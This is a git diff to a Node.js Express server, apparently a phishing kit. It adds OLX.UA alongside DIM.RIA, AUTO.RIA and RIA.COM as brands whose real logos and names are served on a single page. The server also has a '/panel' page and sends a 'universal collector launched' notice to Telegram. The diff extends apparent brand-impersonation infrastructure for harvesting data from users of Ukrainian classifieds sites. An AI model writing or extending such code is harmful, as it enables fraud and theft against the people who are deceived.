@@ -17,19 +17,21 @@ app.use(express.static(__dirname));
 const LOGOS = {
     dimria: "https://play-lh.googleusercontent.com/ztuWEFjw0OavxEvC_Zsxfg9J8gRj_eRFdsSMM7ElokPPUwmc2lAqCW47wbESieS6bw",
     autoria: "https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/ed/43/65/ed436516-dde8-f65c-d03b-99a9f905fcbd/AppIcon-0-1x_U007emarketing-0-8-0-85-220-0.png/1200x630wa.png",
-    ria: "https://ria.riastatic.com/dist/img/logo900.png"
+    ria: "https://ria.riastatic.com/dist/img/logo900.png",
+    olx: "https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/59/21/61/592161cf-9ee3-135c-3e1b-3510535e4b0a/AppIcon_OLX_EU-0-0-1x_U007emarketing-0-8-0-85-220.png/1200x630wa.png"
 };
 
 // === НАЗВИ ПРОЕКТІВ ===
 const PROJECT_NAMES = {
     dimria: "DIM.RIA",
     autoria: "AUTO.RIA",
-    ria: "RIA.COM"
+    ria: "RIA.COM",
+    olx: "OLX.UA"
 };
 
 app.get('/', (req, res) => {
     const project = req.query.project || 'dimria';
-    if (!['dimria', 'autoria', 'ria'].includes(project)) {
+    if (!['dimria', 'autoria', 'ria', 'olx'].includes(project)) {
         return res.status(400).send('Невідомий проект');
     }
     res.sendFile(path.join(__dirname, 'index.html'));
@@ -93,6 +95,6 @@ app.listen(PORT, () => {
     console.log(`Сервер: http://localhost:${PORT}`);
     console.log(`Панель: http://localhost:${PORT}/panel`);
     setTimeout(() => {
-        sendToTelegram(`*УНІВЕРСАЛЬНИЙ КОЛЕКТОР ЗАПУЩЕНО* ✅\nПроекти: DIM.RIA / AUTO.RIA / RIA.COM`);
+        sendToTelegram(`*УНІВЕРСАЛЬНИЙ КОЛЕКТОР ЗАПУЩЕНО* ✅\nПроекти: DIM.RIA / AUTO.RIA / RIA.COM / OLX.UA`);
     }, 3000);
 });
